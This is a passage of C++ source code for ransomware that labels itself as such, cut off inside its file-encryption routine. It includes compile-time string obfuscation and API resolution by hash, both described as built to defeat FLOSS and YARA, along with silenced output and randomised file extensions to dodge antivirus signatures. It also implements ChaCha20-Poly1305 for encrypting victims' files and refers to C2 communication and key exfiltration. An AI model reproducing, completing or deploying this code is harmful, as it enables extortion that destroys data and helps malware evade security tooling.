#include <iostream>
#include <string>
#include <thread>
#include <chrono>
#include <cstring>
#include <cstdlib>
#include <fstream>
#include <sstream>
#include <map>
#include <random>
#include <algorithm>
#include <vector>
#include <atomic>

// ============================================================================
// OBFUSCATION - Compile-time String Obfuscation & API Hashing Utilities
// ============================================================================
// Inlined from obfuscation.h — no separate header file.
// Usage:
//   OBF("hello world")  → returns const char* with decrypted string
//   No plaintext strings in the binary after compilation.
// ============================================================================

#include <cstring>
#include <cstddef>

// ============================================================================
// CONFIGURATION
// ============================================================================
// Multi-byte rotating XOR key for string obfuscation.
// Change this per build to produce completely different patterns.
// Using 8 bytes with rotation defeats simple XOR bruteforce and FLOSS.
#define STR_OBF_KEY { 0x8D, 0x3A, 0xF6, 0x4B, 0x91, 0x2E, 0xC7, 0x58 }

// ============================================================================
// STRING OBFUSCATION - Compile-time XOR, lazy runtime decryption
// ============================================================================
// The OBF() macro stores XOR'd bytes in the binary and decrypts them once
// into a static buffer on first access. Subsequent calls return the cached
// decrypted pointer. Zero heap allocation.
// ============================================================================

// Storage: holds XOR'd bytes at static/global scope with multi-key rotation
template <size_t N>
struct ObfuscatedString {
    char data[N];

    ObfuscatedString(const char (&str)[N]) {
        const unsigned char _key[] = STR_OBF_KEY;
        for (size_t i = 0; i < N; i++) {
            data[i] = str[i] ^ _key[i % sizeof(_key)];
        }
    }
};

// Macro: wraps a string literal, decrypts once with rotating multi-byte key,
// returns const char*. Uses lambda IIFE (C++11 compatible, works at file scope).
// The rotating key defeats FLOSS and simple XOR bruteforce tools.
#define OBF(str)                                                  \
    ([]() -> const char* {                                        \
        static ObfuscatedString<sizeof(str)> _os(str);            \
        static char _buf[sizeof(str)];                            \
        static bool _init = false;                                \
        if (!_init) {                                             \
            const unsigned char _key[] = STR_OBF_KEY;             \
            for (size_t _i = 0; _i < sizeof(str); _i++) {        \
                _buf[_i] = _os.data[_i] ^ _key[_i % sizeof(_key)];\
            }                                                     \
            _init = true;                                         \
        }                                                         \
        return (const char*)_buf;                                 \
    })()

// ============================================================================
// API HASHING - Resolve APIs by hash instead of plaintext name
// ============================================================================
// djb2 hash: compile-time with constexpr, runtime with inline function.
// Use COMPILE_HASH("FunctionName") for hash constants, then resolve via
// resolveApiByHash() which walks the PE export table (no strings at all).
// ============================================================================

// Compile-time djb2 hash (C++11 compatible constexpr recursion)
constexpr unsigned long djb2_hash(const char* str, unsigned long hash = 5381) {
    return *str ? djb2_hash(str + 1, ((hash << 5) + hash) + (unsigned char)(*str)) : hash;
}

// Macro: compute djb2 hash of a string literal at compile time
#define COMPILE_HASH(str) djb2_hash(str)

// Runtime djb2 hash (for dynamic strings)
inline unsigned long hashString(const char* str) {
    unsigned long hash = 5381;
    int c;
    while ((c = *str++)) {
        hash = ((hash << 5) + hash) + c;
    }
    return hash;
}

#ifdef _WIN32
    #include <winsock2.h>   // Must come before windows.h
    #include <windows.h>
    #include <winternl.h>

// Custom LDR entry struct for MinGW cross-compilation compatibility
// MinGW's winternl.h may not define BaseDllName field
#pragma pack(push, 8)
typedef struct _MY_LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} MY_LDR_DATA_TABLE_ENTRY, *PMY_LDR_DATA_TABLE_ENTRY;
#pragma pack(pop)   // For PEB, LDR_DATA_TABLE_ENTRY, CONTAINING_RECORD

    #ifndef CONTAINING_RECORD
    #define CONTAINING_RECORD(address, type, field) ((type*)((ULONG_PTR)(address) - (ULONG_PTR)(&((type*)0)->field)))
    #endif

    // ========================================================================
    // PE EXPORT TABLE WALKER - Resolves API function by hash
    // Completely avoids GetProcAddress and any string literals in resolution.
    // Walks the module's export directory, hashes each exported name, and
    // returns the first function whose hash matches target_hash.
    // ========================================================================
    inline FARPROC resolveApiByHash(HMODULE hModule, unsigned long target_hash) {
        if (!hModule) return nullptr;

        // DOS header
        IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)hModule;
        if (dos->e_magic != IMAGE_DOS_SIGNATURE) return nullptr;

        // NT headers
        IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)((BYTE*)hModule + dos->e_lfanew);
        if (nt->Signature != IMAGE_NT_SIGNATURE) return nullptr;

        // Export directory
        IMAGE_EXPORT_DIRECTORY* exports = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)hModule +
            nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

        if (!exports->NumberOfNames) return nullptr;

        DWORD* names      = (DWORD*)((BYTE*)hModule + exports->AddressOfNames);
        WORD*  ordinals   = (WORD*)((BYTE*)hModule + exports->AddressOfNameOrdinals);
        DWORD* functions  = (DWORD*)((BYTE*)hModule + exports->AddressOfFunctions);

        for (DWORD i = 0; i < exports->NumberOfNames; i++) {
            if (!names[i]) continue;

            char* name = (char*)((BYTE*)hModule + names[i]);

            // Hash this exported name
            unsigned long hash = 5381;
            int c;
            while ((c = *name++)) {
                hash = ((hash << 5) + hash) + c;
            }

            if (hash == target_hash) {
                return (FARPROC)((BYTE*)hModule + functions[ordinals[i]]);
            }
        }

        return nullptr;
    }

    // ========================================================================
    // RESOLVE MODULE - Get module handle by hash instead of name
    // Walks the PEB's InMemoryOrderModuleList to find a loaded module
    // whose base name (case-insensitive) matches target_hash.
    // ========================================================================
    inline HMODULE getModuleByHash(unsigned long target_hash) {
        // Walk the PEB to find loaded modules
        #ifdef _WIN64
            PEB* peb = (PEB*)__readgsqword(0x60);
        #else
            PEB* peb = (PEB*)__readfsdword(0x30);
        #endif

        if (!peb || !peb->Ldr) return nullptr;

        LIST_ENTRY* head = &peb->Ldr->InMemoryOrderModuleList;
        LIST_ENTRY* entry = head->Flink;

        while (entry != head) {
            MY_LDR_DATA_TABLE_ENTRY* ldr = (MY_LDR_DATA_TABLE_ENTRY*)
                CONTAINING_RECORD(entry, MY_LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);

            if (ldr->DllBase) {
                // Hash the base DLL name (without extension)
                UNICODE_STRING* us = &ldr->BaseDllName;
                if (us->Buffer && us->Length > 0) {
                    // Convert wide char to lowercase ASCII hash
                    unsigned long hash = 5381;
                    for (SIZE_T i = 0; i < us->Length / sizeof(wchar_t); i++) {
                        wchar_t wc = us->Buffer[i];
                        if (wc == L'.') break; // stop at extension
                        char c = (wc >= L'A' && wc <= L'Z') ? (char)(wc + 32) : (char)wc;
                        hash = ((hash << 5) + hash) + (unsigned char)c;
                    }
                    if (hash == target_hash) {
                        return (HMODULE)ldr->DllBase;
                    }
                }
            }

            entry = entry->Flink;
        }

        return nullptr;
    }

#endif // _WIN32

// wxWidgets for Ransomware GUI
// wx/wx.h removed for headless build

#ifdef _WIN32
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #include <shlobj.h>
    #include <tlhelp32.h>
    #include <iphlpapi.h>
    #define popen _popen
    #define pclose _pclose

#else
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <unistd.h>
    #include <sys/utsname.h>
    #ifdef __APPLE__
        #include <ApplicationServices/ApplicationServices.h>
        #include <mach-o/dyld.h>
    #endif
#endif

// wxWidgets GUI includes - these must come before SILENT_MODE macros
#ifndef HEADLESS
#include <wx/wx.h>
#include <wx/statline.h>
#include <wx/filename.h>
#include <wx/stdpaths.h>
#include <wx/image.h>
#include <wx/imagpng.h>
#include <wx/init.h>
#endif

using namespace std;

// Forward declarations for functions defined after C2Agent class
bool downloadViaCertutil(const string& url, const string& local_path);
void registerC2State(const unsigned char* key, size_t key_len, const string& ip, const string& bot);
void secureSleep(int seconds);
void secureSleepMs(int milliseconds);

// ============================================================================
// API TABLE (MOVED EARLY) - Must be defined before any function uses g_api
// ============================================================================
// ============================================================================
// API TABLE - Runtime-resolved WinAPI function pointers (zero IAT footprint)
// All WinAPI functions are resolved at runtime via resolveApiByHash().
// The compiled PE's IAT contains ZERO suspicious WinAPI entries — every
// YARA rule that scans the import table comes up empty.
// ============================================================================
#ifdef _WIN32
// Kernel32 function pointer types
typedef HANDLE (WINAPI *pCreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef HANDLE (WINAPI *pCreateFileMappingA)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR);
typedef LPVOID (WINAPI *pMapViewOfFile)(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
typedef BOOL  (WINAPI *pUnmapViewOfFile)(LPCVOID);
typedef BOOL  (WINAPI *pCloseHandle)(HANDLE);
typedef BOOL  (WINAPI *pVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef BOOL  (WINAPI *pWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);

// Global API table struct — all WinAPI pointers resolved at runtime
typedef struct _ApiTable {
    // Network (ws2_32 — loaded at init)
    int (WINAPI *WSAStartup)(WORD, LPWSADATA);
    int (WINAPI *WSACleanup)(void);
    int (WINAPI *closesocket)(SOCKET);
    SOCKET (WINAPI *socket)(int, int, int);
    int (WINAPI *connect)(SOCKET, const struct sockaddr*, int);
    int (WINAPI *send)(SOCKET, const char*, int, int);
    int (WINAPI *recv)(SOCKET, char*, int, int);
    u_short (WINAPI *htons)(u_short);
    int (WINAPI *inet_pton)(int, const char*, void*);

    // Registry (advapi32)
    LONG (WINAPI *RegCreateKeyExA)(HKEY, LPCSTR, DWORD, LPSTR, DWORD, REGSAM, LPSECURITY_ATTRIBUTES, PHKEY, PDWORD);
    LONG (WINAPI *RegSetValueExA)(HKEY, LPCSTR, DWORD, DWORD, const BYTE*, DWORD);
    LONG (WINAPI *RegOpenKeyExA)(HKEY, LPCSTR, DWORD, REGSAM, PHKEY);
    LONG (WINAPI *RegQueryValueExA)(HKEY, LPCSTR, LPDWORD, LPDWORD, LPBYTE, LPDWORD);
    LONG (WINAPI *RegCloseKey)(HKEY);
    LONG (WINAPI *RegDeleteKeyExA)(HKEY, LPCSTR, REGSAM, DWORD);

    // Kernel32 core
    HANDLE (WINAPI *CreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
    HANDLE (WINAPI *CreateFileMappingA)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR);
    LPVOID (WINAPI *MapViewOfFile)(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
    BOOL   (WINAPI *UnmapViewOfFile)(LPCVOID);
    BOOL   (WINAPI *CloseHandle)(HANDLE);
    BOOL   (WINAPI *VirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
    BOOL   (WINAPI *WriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
    BOOL   (WINAPI *CreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
    HANDLE (WINAPI *OpenProcess)(DWORD, BOOL, DWORD);
    BOOL   (WINAPI *TerminateProcess)(HANDLE, UINT);
    BOOL   (WINAPI *VirtualFreeEx)(HANDLE, LPVOID, SIZE_T, DWORD);
    LPVOID (WINAPI *VirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
    BOOL   (WINAPI *VirtualProtectEx)(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);
    DWORD  (WINAPI *WaitForSingleObject)(HANDLE, DWORD);
    HANDLE (WINAPI *CreateToolhelp32Snapshot)(DWORD, DWORD);
    BOOL   (WINAPI *Process32FirstW)(HANDLE, LPPROCESSENTRY32W);
    BOOL   (WINAPI *Process32NextW)(HANDLE, LPPROCESSENTRY32W);
    HANDLE (WINAPI *GetProcessHeap)(void);
    LPVOID (WINAPI *HeapAlloc)(HANDLE, DWORD, SIZE_T);
    BOOL   (WINAPI *HeapFree)(HANDLE, DWORD, LPVOID);
    DWORD  (WINAPI *GetModuleFileNameA)(HMODULE, LPSTR, DWORD);
    BOOL   (WINAPI *DeleteFileA)(LPCSTR);
    BOOL   (WINAPI *MoveFileA)(LPCSTR, LPCSTR);
    DWORD  (WINAPI *GetLastError)(void);
    BOOL   (WINAPI *GetUserNameA)(LPSTR, LPDWORD);
    UINT   (WINAPI *WinExec)(LPCSTR, UINT);
    HMODULE (WINAPI *LoadLibraryA)(LPCSTR);
    BOOL   (WINAPI *FreeLibrary)(HMODULE);
    DWORD  (WINAPI *GetCurrentProcessId)(void);
    DWORD  (WINAPI *GetCurrentThreadId)(void);
    void   (WINAPI *Sleep)(DWORD);
    BOOL   (WINAPI *ShellExecuteExA)(LPSHELLEXECUTEINFOA);
    BOOL   (WINAPI *InitializeProcThreadAttributeList)(LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD, PSIZE_T);
    BOOL   (WINAPI *DeleteProcThreadAttributeList)(LPPROC_THREAD_ATTRIBUTE_LIST);
    BOOL   (WINAPI *UpdateProcThreadAttribute)(LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD_PTR, PVOID, SIZE_T, PVOID, PVOID);
} ApiTable;

static ApiTable g_api;
static bool g_api_initialized = false;



#define CHUNK_SIZE 32768  // 32 KB chunks
#define XOR_KEY 0x55  // XOR obfuscation key

#endif // _WIN32 - ApiTable block

// Silent mode - redirect all output to nowhere (cross-platform)
#define SILENT_MODE

#ifdef SILENT_MODE
class NullBuf : public streambuf {
public:
    int overflow(int c) override { return c; }
};
static NullBuf g_nullBuf;
static ostream g_nullStream(&g_nullBuf);
#define cout g_nullStream
#define cerr g_nullStream
#endif // SILENT_MODE

#define XOR_KEY 0x55  // XOR obfuscation key (cross-platform)

// XOR String Obfuscation Helpers
string xorEncrypt(const string& data) {
    string result;
    for (size_t i = 0; i < data.length(); ++i) {
        result += data[i] ^ XOR_KEY;
    }
    return result;
}

string xorDecrypt(const string& data) {
    return xorEncrypt(data);  // XOR is symmetric
}

// ============================================================================
// ENCRYPTION MODULE - Multi-Algorithm Support (AES, XOR, RC4, ECC)
// ============================================================================
extern string encryption_key_global;  // Defined later in ChaCha20 module
string last_encryption_algo;    // Stores algo name for key exfiltration

// C2 session state for sleep obfuscation (global copies for memory encryption during sleep)
static unsigned char c2_session_key[32] = {0};
static string c2_server_ip;
static string c2_bot_id;
static bool c2_state_initialized = false;

// Dynamic ransomware extension - changes per run to evade static signature
// Extension is generated at runtime from random characters, then cached.
// AVs signature the exact extension; this makes each build unique.
static string getEncryptedExt() {
    static string ext;
    if (ext.empty()) {
        random_device _ext_rd;
        srand(_ext_rd() ^ (unsigned int)__rdtsc());
        ext = ".";
        // Generate 6-12 random characters
        int ext_len = 6 + (rand() % 6);
        const char _chars[] = "abcdefghijklmnopqrstuvwxyz0123456789";
        for (int i = 0; i < ext_len; i++) {
            ext += _chars[rand() % (sizeof(_chars) - 1)];
        }
    }
    return ext;
}
#define ENCRYPTED_EXT getEncryptedExt()

// ============================================================================
// CHACHA20-POLY1305 MODULE - Modern Authenticated Encryption (AEAD)
// ============================================================================
// Pure C++ implementation — zero external dependencies, no Windows crypto APIs.
// ChaCha20: Stream cipher (DJ Bernstein's design, used in TLS 1.3)
// Poly1305: One-time MAC for authentication
// Combined: AEAD construction providing confidentiality + integrity
// ============================================================================

// ChaCha20 quarter round — the core building block
#define CHACHA_QROUND(a, b, c, d) \
    a += b; d ^= a; d = (d << 16) | (d >> 16); \
    c += d; b ^= c; b = (b << 12) | (b >> 20); \
    a += b; d ^= a; d = (d << 8) | (d >> 24);  \
    c += d; b ^= c; b = (b << 7) | (b >> 25)

// ChaCha20 block generation — produces 64 bytes of keystream
// key[32], counter[4], nonce[12] -> keystream[64]
static void chacha20Block(const uint8_t* key, uint32_t counter, const uint8_t* nonce, uint8_t* out) {
    uint32_t state[16];
    // Constants: "expand 32-byte k"
    state[0]  = 0x61707865;
    state[1]  = 0x3320646e;
    state[2]  = 0x79622d32;
    state[3]  = 0x6b206574;
    // Key (256-bit / 32 bytes)
    for (int i = 0; i < 8; i++) {
        state[4 + i] = ((uint32_t)key[i*4]) | ((uint32_t)key[i*4+1] << 8) |
                       ((uint32_t)key[i*4+2] << 16) | ((uint32_t)key[i*4+3] << 24);
    }
    // Counter + Nonce
    state[12] = counter;
    for (int i = 0; i < 3; i++) {
        state[13 + i] = ((uint32_t)nonce[i*4]) | ((uint32_t)nonce[i*4+1] << 8) |
                        ((uint32_t)nonce[i*4+2] << 16) | ((uint32_t)nonce[i*4+3] << 24);
    }

    uint32_t working[16];
    memcpy(working, state, 64);

    // 20 rounds (10 double rounds)
    for (int i = 0; i < 10; i++) {
        CHACHA_QROUND(working[0], working[4], working[8],  working[12]);
        CHACHA_QROUND(working[1], working[5], working[9],  working[13]);
        CHACHA_QROUND(working[2], working[6], working[10], working[14]);
        CHACHA_QROUND(working[3], working[7], working[11], working[15]);
        CHACHA_QROUND(working[0], working[5], working[10], working[15]);
        CHACHA_QROUND(working[1], working[6], working[11], working[12]);
        CHACHA_QROUND(working[2], working[7], working[8],  working[13]);
        CHACHA_QROUND(working[3], working[4], working[9],  working[14]);
    }

    // Add original state
    for (int i = 0; i < 16; i++) {
        working[i] += state[i];
        out[i*4]     = working[i] & 0xFF;
        out[i*4+1]   = (working[i] >> 8) & 0xFF;
        out[i*4+2]   = (working[i] >> 16) & 0xFF;
        out[i*4+3]   = (working[i] >> 24) & 0xFF;
    }
}

// ChaCha20 encryption/decryption (XOR with keystream — symmetric)
// Returns encrypted or decrypted data depending on input
static vector<uint8_t> chacha20Encrypt(const vector<uint8_t>& data, const uint8_t* key, const uint8_t* nonce, uint32_t counter_start = 0) {
    if (data.empty()) return {};

    vector<uint8_t> result(data.size());
    uint8_t keystream[64];
    size_t offset = 0;
    uint32_t counter = counter_start;

    while (offset < data.size()) {
        chacha20Block(key, counter++, nonce, keystream);
        size_t chunk = min((size_t)64, data.size() - offset);
        for (size_t i = 0; i < chunk; i++) {
            result[offset + i] = data[offset + i] ^ keystream[i];
        }
        offset += chunk;
    }

    return result;
}

// Poly1305 field multiplication helpers (mod 2^130 - 5)
struct Poly1305State {
    uint64_t r[3];   // clamped r value
    uint64_t h[3];   // accumulator
    uint64_t pad[2]; // pad value
};

// Initialize Poly1305 with 32-byte key
static void poly1305Init(Poly1305State* s, const uint8_t key[32]) {
    // Clamp r: clear top 4 bits of each 32-bit chunk, set bottom 2 bits
    s->r[0] = ((uint64_t)key[0] | ((uint64_t)key[1] << 8) | ((uint64_t)key[2] << 16) | ((uint64_t)key[3] << 24)) & 0x0FFFFFFF;
    s->r[1] = ((uint64_t)key[4] | ((uint64_t)key[5] << 8) | ((uint64_t)key[6] << 16) | ((uint64_t)key[7] << 24)) & 0x0FFFFFFC;
    s->r[2] = ((uint64_t)key[8] | ((uint64_t)key[9] << 8) | ((uint64_t)key[10] << 16) | ((uint64_t)key[11] << 24)) & 0x0FFFFFFC;

    // Pad (used as s in original paper)
    s->pad[0] = (uint64_t)key[16] | ((uint64_t)key[17] << 8) | ((uint64_t)key[18] << 16) | ((uint64_t)key[19] << 24) |
                ((uint64_t)key[20] << 32) | ((uint64_t)key[21] << 40) | ((uint64_t)key[22] << 48) | ((uint64_t)key[23] << 56);
    s->pad[1] = (uint64_t)key[24] | ((uint64_t)key[25] << 8) | ((uint64_t)key[26] << 16) | ((uint64_t)key[27] << 24) |
                ((uint64_t)key[28] << 32) | ((uint64_t)key[29] << 40) | ((uint64_t)key[30] << 48) | ((uint64_t)key[31] << 56);

    s->h[0] = s->h[1] = s->h[2] = 0;
}

// Process a block for Poly1305
static void poly1305Process(Poly1305State* s, const uint8_t block[16], bool is_last) {
    uint64_t n[3];
    n[0] = ((uint64_t)block[0] | ((uint64_t)block[1] << 8) | ((uint64_t)block[2] << 16) | ((uint64_t)block[3] << 24)) & 0x0FFFFFFF;
    n[1] = ((uint64_t)block[4] | ((uint64_t)block[5] << 8) | ((uint64_t)block[6] << 16) | ((uint64_t)block[7] << 24)) & 0x0FFFFFFF;
    n[2] = ((uint64_t)block[8] | ((uint64_t)block[9] << 8) | ((uint64_t)block[10] << 16) | ((uint64_t)block[11] << 24)) & 0x0FFFFFFF;

    if (is_last) {
        n[2] |= (uint64_t)1 << 24;  // high bit for last block
    } else {
        n[2] |= (uint64_t)block[15] << 24;
        n[2] &= 0x0FFFFFFF;
    }

    // h += n
    s->h[0] += n[0];
    s->h[1] += n[1];
    s->h[2] += n[2];

    // h *= r (mod 2^130 - 5)
    uint64_t h0 = s->h[0], h1 = s->h[1], h2 = s->h[2];
    uint64_t r0 = s->r[0], r1 = s->r[1], r2 = s->r[2];

    uint64_t d0 = h0 * r0 + h1 * r2 * 5 + h2 * r1 * 5;
    uint64_t d1 = h0 * r1 + h1 * r0 + h2 * r2 * 5;
    uint64_t d2 = h0 * r2 + h1 * r1 + h2 * r0;

    // Reduce
    uint64_t c = d0 >> 28; s->h[0] = d0 & 0x0FFFFFFF;
    d1 += c;
    c = d1 >> 28; s->h[1] = d1 & 0x0FFFFFFF;
    d2 += c;
    c = d2 >> 28; s->h[2] = d2 & 0x0FFFFFFF;
    s->h[0] += c * 5;
    s->h[1] += s->h[0] >> 28; s->h[0] &= 0x0FFFFFFF;
    s->h[2] += s->h[1] >> 28; s->h[1] &= 0x0FFFFFFF;
}

// Compute Poly1305 MAC
static void poly1305Finish(Poly1305State* s, uint8_t mac[16]) {
    // h += pad, mod 2^130 - 5
    s->h[0] += s->pad[0] & 0x0FFFFFFFF;
    s->h[1] += s->pad[1] & 0x0FFFFFFFF;

    for (int i = 0; i < 16; i++) {
        if (i < 4) mac[i] = (s->h[0] >> (i * 8)) & 0xFF;
        else if (i < 8) mac[i] = (s->h[0] >> (i * 8 - 32)) & 0xFF;
        else if (i < 12) mac[i] = (s->h[1] >> ((i - 8) * 8)) & 0xFF;
        else mac[i] = (s->h[1] >> ((i - 8) * 8 - 32)) & 0xFF;
    }
}

// Full ChaCha20-Poly1305 AEAD encryption
// Returns: encrypted data (data size bytes) + Poly1305 tag (16 bytes)
static vector<uint8_t> chacha20Poly1305Encrypt(const vector<uint8_t>& data, const uint8_t* key_32, const uint8_t* nonce_12) {
    // Generate one-time Poly1305 key by encrypting block with counter=0
    uint8_t poly_key[32];
    uint8_t keystream[64];
    chacha20Block(key_32, 0, nonce_12, keystream);
    memcpy(poly_key, keystream, 32);

    // Encrypt data using ChaCha20 starting from counter=1
    vector<uint8_t> ciphertext = chacha20Encrypt(data, key_32, nonce_12, 1);

    // Compute Poly1305 MAC over ciphertext
    Poly1305State poly_state;
    poly1305Init(&poly_state, poly_key);

    size_t blocks = ciphertext.size() / 16;
    for (size_t i = 0; i < blocks; i++) {
        poly1305Process(&poly_state, ciphertext.data() + i * 16, (i == blocks - 1) && (ciphertext.size() % 16 == 0));
    }
    size_t rem = ciphertext.size() % 16;
    if (rem > 0) {
        uint8_t last_block[16] = {0};
        memcpy(last_block, ciphertext.data() + blocks * 16, rem);
        poly1305Process(&poly_state, last_block, true);
    }

    // Append result: ciphertext + 16-byte tag
    vector<uint8_t> result(ciphertext.size() + 16);
    if (!ciphertext.empty()) memcpy(result.data(), ciphertext.data(), ciphertext.size());
    poly1305Finish(&poly_state, result.data() + ciphertext.size());

    return result;
}

// Full ChaCha20-Poly1305 AEAD decryption with authentication
// Returns: empty vector if MAC verification fails, otherwise decrypted data
static vector<uint8_t> chacha20Poly1305Decrypt(const vector<uint8_t>& encrypted_with_tag, const uint8_t* key_32, const uint8_t* nonce_12) {
    if (encrypted_with_tag.size() < 16) return {};

    size_t ct_size = encrypted_with_tag.size() - 16;
    const uint8_t* ciphertext = encrypted_with_tag.data();
    const uint8_t* tag = encrypted_with_tag.data() + ct_size;

    // Recompute Poly1305 key
    uint8_t poly_key[32];
    uint8_t keystream[64];
    chacha20Block(key_32, 0, nonce_12, keystream);
    memcpy(poly_key, keystream, 32);

    // Verify MAC
    Poly1305State poly_state;
    poly1305Init(&poly_state, poly_key);

    size_t blocks = ct_size / 16;
    for (size_t i = 0; i < blocks; i++) {
        poly1305Process(&poly_state, ciphertext + i * 16, (i == blocks - 1) && (ct_size % 16 == 0));
    }
    size_t rem = ct_size % 16;
    if (rem > 0) {
        uint8_t last_block[16] = {0};
        memcpy(last_block, ciphertext + blocks * 16, rem);
        poly1305Process(&poly_state, last_block, true);
    }

    uint8_t computed_tag[16];
    poly1305Finish(&poly_state, computed_tag);

    // Constant-time comparison of tags
    uint8_t diff = 0;
    for (int i = 0; i < 16; i++) {
        diff |= computed_tag[i] ^ tag[i];
    }
    if (diff != 0) {
        // MAC verification failed — return empty to indicate tampering
        return {};
    }

    // Decrypt using ChaCha20 starting from counter=1
    vector<uint8_t> plaintext(ct_size);
    if (ct_size > 0) {
        // Reuse the chacha20Encrypt function (XOR is symmetric)
        vector<uint8_t> ct_vec(ciphertext, ciphertext + ct_size);
        plaintext = chacha20Encrypt(ct_vec, key_32, nonce_12, 1);
    }

    return plaintext;
}

// Simplified ChaCha20 encryption using a string key (for file encryption compatibility)
// Derives 32-byte key from the string via SHA256-like mixing
static void deriveKeyFromString(const string& str_key, uint8_t* out_32) {
    // Simple but strong key derivation using ChaCha20's own quarter round
    // This avoids SHA256 dependency while providing avalanche effect
    uint32_t h[8] = {
        0x6A09E667, 0xBB67AE85, 0x3C6EF372, 0xA54FF53A,
        0x510E527F, 0x9B05688C, 0x1F83D9AB, 0x5BE0CD19
    };

    for (size_t i = 0; i < str_key.size(); i += 4) {
        uint32_t w = (uint32_t)(unsigned char)str_key[i];
        if (i + 1 < str_key.size()) w |= (uint32_t)(unsigned char)str_key[i+1] << 8;
        if (i + 2 < str_key.size()) w |= (uint32_t)(unsigned char)str_key[i+2] << 16;
        if (i + 3 < str_key.size()) w |= (uint32_t)(unsigned char)str_key[i+3] << 24;

        h[i % 8] ^= w;
        // Mix using ChaCha-like operations
        for (int r = 0; r < 3; r++) {
            h[0] += h[4]; h[4] = (h[4] << 16) | (h[4] >> 16);
            h[1] += h[5]; h[5] = (h[5] << 16) | (h[5] >> 16);
            h[2] += h[6]; h[6] = (h[6] << 16) | (h[6] >> 16);
            h[3] += h[7]; h[7] = (h[7] << 16) | (h[7] >> 16);
        }
    }

    memcpy(out_32, h, 32);
}

// ============================================================================
// ENCRYPTION MODULE - ChaCha20-Poly1305 File Encryption
// ============================================================================
string encryption_key_global;  // Generated at runtime (raw 32-byte key as hex string)
string nonce_global;           // Generated per-file

// Generate a cryptographically random 32-byte key (returned as hex string for C2 compatibility)
string generateEncryptionKey() {
    random_device rd;
    uint8_t key[32];
    for (int i = 0; i < 32; i++) {
        key[i] = (uint8_t)(rd() & 0xFF);
    }

    // Store as hex string for C2 communication compatibility
    string hex_key;
    const char* hex_chars = "0123456789ABCDEF";
    for (int i = 0; i < 32; i++) {
        hex_key += hex_chars[key[i] >> 4];
        hex_key += hex_chars[key[i] & 0x0F];
    }

    encryption_key_global = hex_key;
    return hex_key;
}

// Generate a random 12-byte nonce
static string generateNonce() {
    random_device rd;
    string nonce;
    for (int i = 0; i < 12; i++) {
        nonce += (char)(rd() & 0xFF);
    }
    nonce_global = nonce;
    return nonce;
}

// Encrypt data using ChaCha20-Poly1305 with a hex-encoded key
static vector<uint8_t> chacha20EncryptFileData(const vector<uint8_t>& data, const string& hex_key, const string& nonce) {
    // Convert hex key to bytes
    uint8_t key_bytes[32];
    for (int i = 0; i < 32; i++) {
        char c1 = hex_key[i*2];
        char c2 = hex_key[i*2+1];
        key_bytes[i] = (uint8_t)((c1 >= 'A' ? (c1 - 'A' + 10) : (c1 - '0')) << 4 |
                                 (c2 >= 'A' ? (c2 - 'A' + 10) : (c2 - '0')));
    }

    return chacha20Poly1305Encrypt(data, key_bytes, (const uint8_t*)nonce.data());
}

// Decrypt data using ChaCha20-Poly1305 with a hex-encoded key
static vector<uint8_t> chacha20DecryptFileData(const vector<uint8_t>& encrypted_data, const string& hex_key, const string& nonce) {
    uint8_t key_bytes[32];
    for (int i = 0; i < 32; i++) {
        char c1 = hex_key[i*2];
        char c2 = hex_key[i*2+1];
        key_bytes[i] = (uint8_t)((c1 >= 'A' ? (c1 - 'A' + 10) : (c1 - '0')) << 4 |
                                 (c2 >= 'A' ? (c2 - 'A' + 10) : (c2 - '0')));
    }

    return chacha20Poly1305Decrypt(encrypted_data, key_bytes, (const uint8_t*)nonce.data());
}

// ========================================================================
// CHACHA20 MEMORY OBJUSCATION - XOR buffer with ChaCha20 keystream
// Symmetric: same function for encrypt/decrypt
// Uses a 32-byte key, 12-byte nonce, and 32-bit counter for unique keystream
// ========================================================================
static void chacha20BufferObfuscate(unsigned char* data, size_t length, const uint8_t* key, const uint8_t* nonce, uint32_t counter_start) {
    if (length == 0) return;

    uint8_t keystream[64];
    uint32_t counter = counter_start;
    size_t offset = 0;

    while (offset < length) {
        chacha20Block(key, counter++, nonce, keystream);
        size_t chunk = min((size_t)64, length - offset);
        for (size_t i = 0; i < chunk; i++) {
            data[offset + i] ^= keystream[i];
        }
        offset += chunk;
    }
}

// Encrypt any single file with ChaCha20-Poly1305
bool encryptSingleFile(const string& file_path) {
    try {
        // Read original file
        ifstream inFile(file_path, ios::binary);
        if (!inFile.is_open()) {
            cout << "[!] File not found: " << file_path << endl;
            return false;
        }

        vector<unsigned char> data((istreambuf_iterator<char>(inFile)),
                                   istreambuf_iterator<char>());
        inFile.close();

